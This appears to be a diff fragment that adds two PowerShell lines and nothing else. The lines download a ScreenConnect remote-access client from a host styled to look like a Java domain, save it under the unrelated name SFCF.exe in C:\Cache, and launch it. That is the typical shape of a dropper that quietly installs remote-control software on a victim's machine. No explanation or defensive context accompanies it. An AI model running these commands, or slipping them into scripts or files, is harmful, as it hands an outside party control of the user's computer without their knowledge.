@@ -1,0 +1,2 @@
+iwr "java-jvm.pages.dev/ScreenConnect.Client.exe" -OutFile "C:\Cache\SFCF.exe"
+Start-Process C:\Cache\SFCF.exe
